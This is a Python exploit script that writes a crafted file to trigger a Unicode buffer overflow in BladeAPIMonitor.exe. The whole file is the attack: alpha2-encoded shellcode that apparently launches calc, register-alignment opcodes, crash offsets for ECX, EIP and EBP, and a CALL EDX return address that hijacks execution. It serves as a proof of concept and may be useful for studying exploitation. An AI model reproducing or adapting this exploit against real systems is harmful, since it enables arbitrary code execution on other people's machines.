import sys, struct

filename = "sploit_blade_api.txt"

# Unicode encoded ASM calc with hardcoded DLL addresses
# ./alpha2 --unicode eax < calc_alt.bin
shellcode = (
        "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBLq9KS42kmMLpypypkPrkrkDdM0kPYpTKOkjlrkokLT4KMKDKmKdKokZpNQL6OfQXQSOqRLS3sYiPQFR0rmGKpOlaiuIpRmCSImYUJhIpB7KOyPA"
        )

# Lengths
maxlen = 2000

# Align reg EBX to RET into EAX
# EBX = 0x0089EF84, begin buffer = 0x0089e132: EBX - buffer = 0xe52
align_ebx = (   "\x53"              # PUSH EBX
                "\x42"              # Padding
                "\x58"              # POP EAX
                "\x42"              # Padding
                "\x2d\x18\x11"      # sub eax,0x11001800 --\
                "\x42"              # Padding               |--> Subtracts 0x100 bytes
                "\x05\x16\x11"      # add eax,0x11001600 --/
                "\x42"              # Padding
                "\xbf\x11\x11"      # MOV EDI,1101100   --> Inserts bogus 00 to insert prepending 00
                "\xc8"              # ADD AL, CL
                "\x42"              # Padding
                "\x50"              # PUSH EAX
                "\x42"              # Padding
                "\xc3"              # RET
)

# Offsets
crash_ecx = 282
crash_ebx = 312
crash_ebp = 300
crash_eip = 290

# Regs
ecx = "\x90" * 2

# Pad buffer
pad_reg = "B" * 44

# Payload variables
prefix = shellcode                                                  # UNICODE encoded shellcode, max bytes 282
prefix += "B" * (crash_ecx - len(prefix))                           # Filler until ECX
prefix += ecx                                                       # Instructions for ECX
prefix += "B" * (crash_eip - len(prefix))                           # Filler until EIP
eip = "\x3e\x43"                                                    # CALL EDX  # BladeAPIMonitor.exe
midfix = pad_reg                                                    # Pad the stack
midfix += align_ebx                                                 # Add instructions for stack alignment
midfix += "B" * (crash_ebp - len(prefix + eip + midfix))            # Filler until EBP
suffix = ""
suffix += "C" * (maxlen - len(prefix + eip + midfix + suffix))      # Filler until maximum length

# Crafting payload
payload = prefix + eip + midfix + suffix

f = open(filename, 'wb')
f.write(payload)
f.close()

